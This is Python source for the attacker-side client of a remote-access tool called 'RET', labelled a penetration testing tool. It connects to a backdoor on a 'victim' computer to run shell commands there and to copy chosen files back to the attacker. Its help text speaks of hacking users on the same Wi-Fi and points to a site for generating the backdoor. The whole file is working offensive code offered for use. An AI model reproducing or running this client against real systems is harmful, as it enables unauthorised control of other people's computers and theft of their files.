# IMPORTS


import time
import socket
import os
# END OF IMPORTS

# ATTACKER CLIENT
#########################


class FileGrab(object):
    def __init__(self, bind_ip, dir="grabbed_files/", bind_port=2367):
        self.bind_ip = bind_ip
        self.bind_port = bind_port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.dir = dir
        self.start()

    def send(self, message, connection):
        connection.send(message.encode())

    def start(self):
        try:
            print(f"[+] Attempting to connect to backdoor : {self.bind_ip} at port : {self.bind_port}")
            time.sleep(1)
            self.s.connect((self.bind_ip, self.bind_port))
            print(f"[+] Connected to backdoor ({self.bind_ip} at port : {self.bind_port})\n")

            self.filepath = input(f"(to exit: -Exit)({self.bind_ip}:{self.bind_port}) Enter the path of the file to grab : ")

            self.grab(file=self.filepath)
        except Exception:
            print("[-] Backdoor not opened yet : wait until victim opens the backdoor and then try again")
            return file_grab()

    def grab(self, file):
        self.s.sendall("filegrab".encode())
        if self.filepath == "-Exit":
            self.send(self.filepath, self.s)
            print("\033[1;31;40m[-] Exiting ...\n")
            return main()

        else:
            BUFF_SIZE = 4096
            data = b''
            self.s.sendall(file.encode())
            while True:
                part = self.s.recv(BUFF_SIZE)
                data += part
                if len(part) < BUFF_SIZE:
                    break

        self.filename = input("Enter the name you want to be assigned to the grabbed file : ")
        self.new_file = open(f"{self.filename}", "wb")
        self.new_file.write(data)
        time.sleep(2)
        os.system(f"mv {self.filename} {self.dir}")
        print(f"[+] Process finished. {self.filename} situated in {self.dir} folder\n")
        self.s.close()


class ShellControl(object):
    def __init__(self, ip, port=2367):
        self.ip = ip
        self.port = port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.start()
        self.if_cicle()

    def start(self):
        try:
            print(f"[+] Attempting to connect to backdoor : {self.ip} at port : {self.port}")
            time.sleep(1)
            self.client.connect((self.ip, self.port))
        except Exception:
            print("[-] Backdoor not opened yet : wait until victim opens the backdoor and then try again")
            return rev_shell()

    def send(self, message, connection):
        connection.send(message.encode())

    def receive(self, connection):
        try:
            response = connection.recv(1024)
            response = response.decode()
            print(f"\n[+] backdoor: ({self.ip}:{self.port}) > \n\n{response}")

        except:
            print("[-] Command not known")
            return self.if_cicle()

    def if_cicle(self):
        self.send("shell_control", self.client)
        print(f"[+] Connected to backdoor ({self.ip} at port : {self.port})\n")
        while True:
            command = input(f"(to exit: -Exit)({self.ip}'s shell) >> ")
            if command == "-Exit":
                print("\033[1;31;40m[-] Exiting ...\n")
                self.send(command, self.client)
                return main()
            else:
                command = command + "&& echo  && echo current directory : && pwd"
                self.send(command, self.client)
                self.receive(self.client)

#########################
# END OF ATTACKER CLIENT

# INFO


__author__ = "Tommaso De Ponti", "RET Company"
__project_name__ = "RET"
__project_site__ = "https://"
# END OF INFO

# CREATE OUR TITLE


class Title(object):
    def __init__(self):
        title = """\033[1;34;40m
                                ____  ____________                             
                               / __ \/ ____/_  __/                            
                              / /_/ / __/   / /                                
                             / _, _/ /___  / /                                
                            /_/ |_/_____/ /_/                                                                           
                     REVERSE     ENGINEERING     TOOL  
                  \033[1;31;40m                                                                                                                                                                                                                                                                                                                                                                                                                  
  +---------------------+                         +----------------+           
  !         RET         !                         !                !           
  !                     !      RET BACKDOOR       !    HACKED      !           
  !    !         !      ! >---------------------< !                !           
  !                     !                         !                ! \         
  +---------------------+                         +----------------+   \       
                                                          \              \     
  by RET company                                           !              !                                                      
  website                                         ! ! ! ! ! ! ! ! ! !    !!!   
  github                                          +-----------------+     +                                                                           
  FOR HELP TYPE: -help
  FOR USAGE TYPE : -usage      
        """
        print(title)
# END OF TITLE CREATING

# TEST FUNCTION


def test():
    while True:
        pass
# END OF TEST FUNCTION

# HELP MESSAGE


def help_message():
    msg = """
    
Welcome to the RET Service.
This service provides to give you a pure python penetration testing tool
github : 
website : 
To know how to use RET type : "-usage"
  
    """

    print(msg)
# END OF HELP MESSAGE

# USAGE MESSAGE


def usage_message():
    msg = """
    
Use reverse shell (ALL OS) : ret reverse/shell
--- with the reverse shell mode you will be able to execute shell commands on victim computer
    REMEMBER THAT THIS WORKS FOR ALL OS   
    
Use file grab (ALL OS) : ret reverse/filegrab    
--- with the file grab mode you will be able to grab files from victim computer
    REMEMBER THAT THIS WORKS FOR ALL OS AND SUPPORTS ALL TYPES OF FILES

    """

    print(msg)
# END OF USAGE MESSAGE

# REVERSE SHELL FUNCTION


def rev_shell():
    rev_shell_usage = """   

Reverse Shell mode : To start this mode type : [victim ip].
EXAMPLE : 192.168.1.112.
NOTE THAT 192.168.1.112 IS THE VICTIM IP

Once you type that RET will try to connect to the victim computer. Remember that the victim has to execute your backdoor first.
GENERATE THE BACKDOOR FROM THE OFFICIAL RET SITE : https://

REMEMBER : IF YOU DO NOT ENABLE PORT FORWARDING RET WILL JUST WORK OVER YOUR NETWORK. SO YOU CAN JUST HACK USERS THAT ARE CONNECTED TO YOUR NETWORK (WI-FI)
    
TYPE : -ret TO GO BACK TO THE HOME PAGE
TYPE : -help TO SEE THIS MESSAGE AGAIN

            """
    print(rev_shell_usage)
    victim_ip = input("\033[1;32;40m RET" + "\033[1;34;40m (reverse/shell)" + "\033[0;36;40m victim ip > " + "\033[0;33;40m")
    if victim_ip == "-help":
        print(rev_shell_usage)
        return rev_shell()
    elif victim_ip == "-ret":
        return main()
    ShellControl(ip=victim_ip)
# END OF REVERSE SHELL FUNCTION

# FILE GRAB FUNCTION


def file_grab():
    file_grab_usage = """   

File Grab mode : To start this mode type : [victim ip].
EXAMPLE : 192.168.1.112.
NOTE THAT 192.168.1.112 IS THE VICTIM IP

Once you type that RET will try to connect to the victim computer. Remember that the victim has to execute the backdoor first.
GENERATE THE BACKDOOR FROM THE OFFICIAL RET SITE : https://

REMEMBER : IF YOU DO NOT ENABLE PORT FORWARDING RET WILL JUST WORK OVER YOUR NETWORK. SO YOU CAN JUST HACK USERS THAT ARE CONNECTED TO YOUR NETWORK (WI-FI)

TYPE : -ret TO GO BACK TO THE HOME PAGE
TYPE : -help TO SEE THIS MESSAGE AGAIN

                    """
    print(file_grab_usage)
    victim_ip = input("\033[1;32;40m RET" + "\033[1;34;40m (reverse/filegrab)> " + "\033[0;36;40m victim ip > " + "\033[0;33;40m")
    if victim_ip == "-help":
        print(file_grab_usage)
        return file_grab()
    elif victim_ip == "-ret":
        return main()
    else:
        FileGrab(bind_ip=victim_ip)
        return main()
# END OF FILE GRAB FUNCTION

# MAIN FUNCTION


def main():
    ret = input("\033[1;32;40m RET > " + "\033[0;33;40m")

    if ret == "-help":
        help_message()
        return main()

    if ret == "-usage":
        usage_message()
        return main()

    if ret == "ret reverse/shell":
        rev_shell()

    if ret == "ret reverse/filegrab":
        file_grab()

    elif ret != "ret reverse/filegrab" or "ret reverse/file_grab " or "ret reverse/shell" or "ret reverse/shell " or "-help" or "-usage":
        print(f"\033[1;31;40m Invalid command : {ret} : type -help or go to the official ret site to look at the usage")
        return main()

# END OF MAIN FUNCTION

# EXECUTING THE CODE


if __name__ == '__main__':
    Title()
    main()

# END OF THE CODE
